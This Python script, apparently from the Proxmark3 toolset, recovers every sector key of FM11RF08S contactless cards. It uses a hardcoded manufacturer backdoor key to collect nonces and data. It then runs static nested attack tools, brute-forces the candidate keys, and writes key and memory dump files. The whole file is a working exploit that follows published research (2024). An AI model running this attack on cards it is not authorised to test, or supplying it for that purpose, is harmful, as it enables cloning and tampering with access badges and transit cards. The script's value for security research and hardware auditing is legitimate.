#!/usr/bin/env python3

# Combine several attacks to recover all FM11RF08S keys
#
# Conditions:
# * Presence of the backdoor with known key
#
# Duration strongly depends on some key being reused and where.
# Examples:
# * 32 random keys: ~20 min
# * 16 random keys with keyA==keyB in each sector: ~30 min
# * 24 random keys, some reused across sectors: <1 min
#
# Doegox, 2024, cf https://eprint.iacr.org/2024/1275 for more info

import os
import sys
import time
import subprocess
import argparse
import json
import pm3
# optional color support
try:
    # pip install ansicolors
    from colors import color
except ModuleNotFoundError:
    def color(s, fg=None):
        _ = fg
        return str(s)

BACKDOOR_RF08S = "A396EFA4E24F"
NUM_SECTORS = 16
DICT_DEF = "mfc_default_keys.dic"
DEFAULT_KEYS = set()
if os.path.basename(os.path.dirname(os.path.dirname(sys.argv[0]))) == 'client':
    # dev setup
    TOOLS_PATH = os.path.normpath(os.path.join(f"{os.path.dirname(sys.argv[0])}",
                                               "..", "..", "tools", "mfc", "card_only"))
    DICT_DEF_PATH = os.path.normpath(os.path.join(f"{os.path.dirname(sys.argv[0])}",
                                                  "..", "dictionaries", DICT_DEF))
else:
    # assuming installed
    TOOLS_PATH = os.path.normpath(os.path.join(f"{os.path.dirname(sys.argv[0])}",
                                               "..", "tools"))
    DICT_DEF_PATH = os.path.normpath(os.path.join(f"{os.path.dirname(sys.argv[0])}",
                                                  "dictionaries", DICT_DEF))

tools = {
    "staticnested_1nt": os.path.join(f"{TOOLS_PATH}", "staticnested_1nt"),
    "staticnested_2x1nt": os.path.join(f"{TOOLS_PATH}", "staticnested_2x1nt_rf08s"),
    "staticnested_2x1nt1key": os.path.join(f"{TOOLS_PATH}", "staticnested_2x1nt_rf08s_1key"),
}
for tool, bin in tools.items():
    if not os.path.isfile(bin):
        if os.path.isfile(bin + ".exe"):
            tools[tool] = bin + ".exe"
        else:
            print(f"Cannot find {bin}, abort!")
            exit()

parser = argparse.ArgumentParser(description='A script combining staticnested* tools '
                                 'to recover all keys from a FM11RF08S card.')
parser.add_argument('-x', '--init-check', action='store_true', help='Run an initial fchk for default keys')
parser.add_argument('-y', '--final-check', action='store_true', help='Run a final fchk with the found keys')
parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')
args = parser.parse_args()

start_time = time.time()
p = pm3.pm3()

p.console("hf 14a read")
uid = None

for line in p.grabbed_output.split('\n'):
    if "UID:" in line:
        uid = int(line[10:].replace(' ', '')[-8:], 16)

if uid is None:
    print("Card not found")
    exit()
print("UID: " + color(f"{uid:08X}", fg="green"))


def print_key(sec, key_type, key):
    kt = ['A', 'B'][key_type]
    print(f"Sector {sec:2} key{kt} = " + color(key, fg="green"))


found_keys = [["", ""] for _ in range(NUM_SECTORS)]
if args.init_check:
    print("Checking default keys...")
    p.console("hf mf fchk")
    for line in p.grabbed_output.split('\n'):
        if "[+]  0" in line:
            res = [x.strip() for x in line.split('|')]
            sec = int(res[0][4:])
            if res[3] == '1':
                found_keys[sec][0] = res[2]
                print_key(sec, 0, found_keys[sec][0])
            if res[5] == '1':
                found_keys[sec][1] = res[4]
                print_key(sec, 1, found_keys[sec][1])

print("Getting nonces...")
cmd = f"hf mf isen --collect_fm11rf08s_with_data --key {BACKDOOR_RF08S}"
p.console(cmd)
try:
    nt, nt_enc, par_err, data = json.loads(p.grabbed_output)
except json.decoder.JSONDecodeError:
    print("Error getting nonces, abort.")
    exit()

print("Generating first dump file")
dumpfile = f"hf-mf-{uid:08X}-dump.bin"
with (open(dumpfile, "wb")) as f:
    for sec in range(NUM_SECTORS):
        for b in range(4):
            d = data[(sec * 4) + b]
            if b == 3:
                ka = found_keys[sec][0]
                kb = found_keys[sec][1]
                if ka == "":
                    ka = "FFFFFFFFFFFF"
                if kb == "":
                    kb = "FFFFFFFFFFFF"
                d = ka + d[12:20] + kb
            f.write(bytes.fromhex(d))
print(f"Data have been dumped to `{dumpfile}`")

elapsed_time1 = time.time() - start_time
minutes = int(elapsed_time1 // 60)
seconds = int(elapsed_time1 % 60)
print("----Step 1: " + color(f"{minutes:2}", fg="yellow") + " minutes " +
      color(f"{seconds:2}", fg="yellow") + " seconds -----------")

if os.path.isfile(DICT_DEF_PATH):
    print(f"Loading {DICT_DEF}")
    with open(DICT_DEF_PATH, 'r', encoding='utf-8') as file:
        for line in file:
            if line[0] != '#' and len(line) >= 12:
                DEFAULT_KEYS.add(line[:12])
else:
    print(f"Warning, {DICT_DEF} not found.")

print("Running staticnested_1nt & 2x1nt when doable...")
keys = [[set(), set()] for _ in range(NUM_SECTORS)]
all_keys = set()
duplicates = set()
# Availability of filtered dicts
filtered_dicts = [[False, False] for _ in range(NUM_SECTORS)]
found_default = [[False, False] for _ in range(NUM_SECTORS)]
for sec in range(NUM_SECTORS):
    if found_keys[sec][0] != "" and found_keys[sec][1] != "":
        continue
    if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] != nt[sec][1]:
        for key_type in [0, 1]:
            cmd = [tools["staticnested_1nt"], f"{uid:08X}", f"{sec}",
                   nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
            if args.debug:
                print(' '.join(cmd))
            subprocess.run(cmd, capture_output=True)
        cmd = [tools["staticnested_2x1nt"],
               f"keys_{uid:08x}_{sec:02}_{nt[sec][0]}.dic", f"keys_{uid:08x}_{sec:02}_{nt[sec][1]}.dic"]
        if args.debug:
            print(' '.join(cmd))
        subprocess.run(cmd, capture_output=True)
        filtered_dicts[sec][key_type] = True
        for key_type in [0, 1]:
            keys_set = set()
            with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic")) as f:
                while line := f.readline().rstrip():
                    keys_set.add(line)
                keys[sec][key_type] = keys_set
                duplicates.update(all_keys.intersection(keys_set))
                all_keys.update(keys_set)
            # Prioritize default keys
            keys_def_set = DEFAULT_KEYS.intersection(keys_set)
            keys_set.difference_update(DEFAULT_KEYS)
            if len(keys_def_set) > 0:
                found_default[sec][key_type] = True
                with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic", "w")) as f:
                    for k in keys_def_set:
                        f.write(f"{k}\n")
                    for k in keys_set:
                        f.write(f"{k}\n")
    else:  # one key not found or both identical
        if found_keys[sec][0] == "":
            key_type = 0
        else:
            key_type = 1
        cmd = [tools["staticnested_1nt"], f"{uid:08X}", f"{sec}",
               nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
        if args.debug:
            print(' '.join(cmd))
        subprocess.run(cmd, capture_output=True)
        keys_set = set()
        with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}.dic")) as f:
            while line := f.readline().rstrip():
                keys_set.add(line)
            keys[sec][key_type] = keys_set
            duplicates.update(all_keys.intersection(keys_set))
            all_keys.update(keys_set)
        # Prioritize default keys
        keys_def_set = DEFAULT_KEYS.intersection(keys_set)
        keys_set.difference_update(DEFAULT_KEYS)
        if len(keys_def_set) > 0:
            found_default[sec][key_type] = True
            with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}.dic", "w")) as f:
                for k in keys_def_set:
                    f.write(f"{k}\n")
                for k in keys_set:
                    f.write(f"{k}\n")

print("Looking for common keys across sectors...")
keys_filtered = [[set(), set()] for _ in range(NUM_SECTORS)]
for dup in duplicates:
    for sec in range(NUM_SECTORS):
        for key_type in [0, 1]:
            if dup in keys[sec][key_type]:
                keys_filtered[sec][key_type].add(dup)
                if nt[sec][0] == nt[sec][1] and key_type == 0 and keys[sec][1] == set() and found_keys[sec][1] == "":
                    keys_filtered[sec][1].add(dup)
                    continue

# Availability of duplicates dicts
duplicates_dicts = [[False, False] for _ in range(NUM_SECTORS)]
first = True
for sec in range(NUM_SECTORS):
    for key_type in [0, 1]:
        if len(keys_filtered[sec][key_type]) > 0:
            if first:
                print("Saving duplicates dicts...")
                first = False
            with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_duplicates.dic", "w")) as f:
                for k in keys_filtered[sec][key_type]:
                    f.write(f"{k}\n")
            duplicates_dicts[sec][key_type] = True

print("Computing needed time for attack...")
candidates = [[0, 0] for _ in range(NUM_SECTORS)]
for sec in range(NUM_SECTORS):
    for key_type in [0, 1]:
        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and duplicates_dicts[sec][key_type]:
            kt = ['a', 'b'][key_type]
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_duplicates.dic"
            with open(dic, 'r') as file:
                count = sum(1 for _ in file)
#            print(f"dic {dic} size {count}")
            candidates[sec][key_type] = count
            if nt[sec][0] == nt[sec][1]:
                candidates[sec][key_type ^ 1] = 1
    for key_type in [0, 1]:
        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and filtered_dicts[sec][key_type] and candidates[sec][0] == 0 and candidates[sec][1] == 0:
            if found_default[sec][key_type]:
                # We assume the default key is correct
                candidates[sec][key_type] = 1
            else:
                kt = ['a', 'b'][key_type]
                dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic"
                with open(dic, 'r') as file:
                    count = sum(1 for _ in file)
#                print(f"dic {dic} size {count}")
                candidates[sec][key_type] = count
    if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] == nt[sec][1] and candidates[sec][0] == 0 and candidates[sec][1] == 0:
        if found_default[sec][0]:
            # We assume the default key is correct
            candidates[sec][0] = 1
            candidates[sec][1] = 1
        else:
            key_type = 0
            kt = ['a', 'b'][key_type]
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}.dic"
            with open(dic, 'r') as file:
                count = sum(1 for _ in file)
#            print(f"dic {dic} size {count}")
            candidates[sec][0] = count
            candidates[sec][1] = 1

if args.debug:
    for sec in range(NUM_SECTORS):
        print(f" {sec:03} | {sec*4+3:03} | {candidates[sec][0]:6} | {candidates[sec][1]:6}  ")
total_candidates = sum(candidates[sec][0] + candidates[sec][1] for sec in range(NUM_SECTORS))

elapsed_time2 = time.time() - start_time - elapsed_time1
minutes = int(elapsed_time2 // 60)
seconds = int(elapsed_time2 % 60)
print("----Step 2: " + color(f"{minutes:2}", fg="yellow") + " minutes " +
      color(f"{seconds:2}", fg="yellow") + " seconds -----------")

# fchk: 147 keys/s. Correct key found after 50% of candidates on average
FCHK_KEYS_S = 147
foreseen_time = (total_candidates / 2 / FCHK_KEYS_S) + 5
minutes = int(foreseen_time // 60)
seconds = int(foreseen_time % 60)
print("Still about " + color(f"{minutes:2}", fg="yellow") + " minutes " +
      color(f"{seconds:2}", fg="yellow") + " seconds to run...")

abort = False
print("Brute-forcing keys... Press any key to interrupt")
for sec in range(NUM_SECTORS):
    for key_type in [0, 1]:
        # If we have a duplicates dict
        # note: we skip if we already know one key
        # as using 2x1nt1key later will be faster
        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and duplicates_dicts[sec][key_type]:
            kt = ['a', 'b'][key_type]
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_duplicates.dic"
            cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
            if args.debug:
                print(cmd)
            p.console(cmd)
            for line in p.grabbed_output.split('\n'):
                if "aborted via keyboard" in line:
                    abort = True
                if "found:" in line:
                    found_keys[sec][key_type] = line[30:]
                    print_key(sec, key_type, found_keys[sec][key_type])
                    if nt[sec][0] == nt[sec][1] and found_keys[sec][key_type ^ 1] == "":
                        found_keys[sec][key_type ^ 1] = found_keys[sec][key_type]
                        print_key(sec, key_type ^ 1, found_keys[sec][key_type ^ 1])
        if abort:
            break
    if abort:
        break

    for key_type in [0, 1]:
        # If we have a filtered dict
        # note: we skip if we already know one key
        # as using 2x1nt1key later will be faster
        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and filtered_dicts[sec][key_type]:
            # Use filtered dict
            kt = ['a', 'b'][key_type]
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic"
            cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
            if args.debug:
                print(cmd)
            p.console(cmd)
            for line in p.grabbed_output.split('\n'):
                if "aborted via keyboard" in line:
                    abort = True
                if "found:" in line:
                    found_keys[sec][key_type] = line[30:]
                    print_key(sec, key_type, found_keys[sec][key_type])
        if abort:
            break
    if abort:
        break

    # If one common key for the sector
    if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] == nt[sec][1]:
        key_type = 0
        # Use regular dict
        kt = ['a', 'b'][key_type]
        dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}.dic"
        cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
        if args.debug:
            print(cmd)
        p.console(cmd)
        for line in p.grabbed_output.split('\n'):
            if "aborted via keyboard" in line:
                abort = True
            if "found:" in line:
                found_keys[sec][0] = line[30:]
                found_keys[sec][1] = line[30:]
                print_key(sec, 0, found_keys[sec][key_type])
                print_key(sec, 1, found_keys[sec][key_type])
    if abort:
        break

    # If one key is missing, use the other one with 2x1nt1key
    if ((found_keys[sec][0] == "") ^ (found_keys[sec][1] == "")) and nt[sec][0] != nt[sec][1]:
        if (found_keys[sec][0] == ""):
            key_type_source = 1
            key_type_target = 0
        else:
            key_type_source = 0
            key_type_target = 1
        if duplicates_dicts[sec][key_type_target]:
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}_duplicates.dic"
        elif filtered_dicts[sec][key_type_target]:
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}_filtered.dic"
        else:
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}.dic"
        cmd = [tools["staticnested_2x1nt1key"], nt[sec][key_type_source], found_keys[sec][key_type_source], dic]
        if args.debug:
            print(' '.join(cmd))
        result = subprocess.run(cmd, capture_output=True, text=True).stdout
        keys = set()
        for line in result.split('\n'):
            if "MATCH:" in line:
                keys.add(line[12:])
        if len(keys) > 1:
            kt = ['a', 'b'][key_type_target]
            cmd = f"hf mf fchk --blk {sec * 4} -{kt} --no-default"
            for k in keys:
                cmd += f" -k {k}"
            if args.debug:
                print(cmd)
            p.console(cmd)
            for line in p.grabbed_output.split('\n'):
                if "aborted via keyboard" in line:
                    abort = True
                if "found:" in line:
                    found_keys[sec][key_type_target] = line[30:]
        elif len(keys) == 1:
            found_keys[sec][key_type_target] = keys.pop()
        if found_keys[sec][key_type_target] != "":
            print_key(sec, key_type_target, found_keys[sec][key_type_target])
    if abort:
        break

if abort:
    print("Brute-forcing phase aborted via keyboard!")
    args.final_check = False

if args.final_check:
    print("Letting fchk do a final dump, just for confirmation and display...")
    keys_set = set([i for sl in found_keys for i in sl if i != ""])
    with (open(f"keys_{uid:08x}.dic", "w")) as f:
        for k in keys_set:
            f.write(f"{k}\n")
    cmd = f"hf mf fchk -f keys_{uid:08x}.dic --no-default --dump"
    if args.debug:
        print(cmd)
    p.console(cmd, passthru = True)
else:
    plus = "[" + color("+", fg="green") + "] "
    print()
    print(plus + color("found keys:", fg="green"))
    print()
    print(plus + "-----+-----+--------------+---+--------------+----")
    print(plus + " Sec | Blk | key A        |res| key B        |res")
    print(plus + "-----+-----+--------------+---+--------------+----")
    for sec in range(NUM_SECTORS):
        keys = [["", 0], ["", 0]]
        for key_type in [0, 1]:
            if found_keys[sec][key_type] == "":
                keys[key_type] = [color("------------", fg="red"), color("0", fg="red")]
            else:
                keys[key_type] = [color(found_keys[sec][key_type], fg="green"), color("1", fg="green")]
        print(plus + f" {sec:03} | {sec*4+3:03} | {keys[0][0]} | {keys[0][1]} | {keys[1][0]} | {keys[1][1]} ")
    print(plus + "-----+-----+--------------+---+--------------+----")
    print(plus + "( " + color("0", fg="red") + ":Failed / " +
          color("1", fg="green") + ":Success )")
    print()
    print(plus + "Generating binary key file")
    keyfile = f"hf-mf-{uid:08X}-key.bin"
    unknown = False
    with (open(keyfile, "wb")) as f:
        for key_type in [0, 1]:
            for sec in range(NUM_SECTORS):
                k = found_keys[sec][key_type]
                if k == "":
                    k = "FFFFFFFFFFFF"
                    unknown = True
                f.write(bytes.fromhex(k))
    print(plus + "Found keys have been dumped to `" + color(keyfile, fg="yellow")+"`")
    if unknown:
        print("[" + color("=", fg="yellow") + "]  --[ " + color("FFFFFFFFFFFF", fg="yellow") +
              " ]-- has been inserted for unknown keys")
    print(plus + "Generating final dump file")
    dumpfile = f"hf-mf-{uid:08X}-dump.bin"
    with (open(dumpfile, "wb")) as f:
        for sec in range(NUM_SECTORS):
            for b in range(4):
                d = data[(sec * 4) + b]
                if b == 3:
                    ka = found_keys[sec][0]
                    kb = found_keys[sec][1]
                    if ka == "":
                        ka = "FFFFFFFFFFFF"
                    if kb == "":
                        kb = "FFFFFFFFFFFF"
                    d = ka + d[12:20] + kb
                f.write(bytes.fromhex(d))
    print(plus + "Data have been dumped to `" + color(dumpfile, fg="yellow")+"`")

elapsed_time3 = time.time() - start_time - elapsed_time1 - elapsed_time2
minutes = int(elapsed_time3 // 60)
seconds = int(elapsed_time3 % 60)
print("----Step 3: " + color(f"{minutes:2}", fg="yellow") + " minutes " +
      color(f"{seconds:2}", fg="yellow") + " seconds -----------")

elapsed_time = time.time() - start_time
minutes = int(elapsed_time // 60)
seconds = int(elapsed_time % 60)
print("---- TOTAL: " + color(f"{minutes:2}", fg="yellow") + " minutes " +
      color(f"{seconds:2}", fg="yellow") + " seconds -----------")
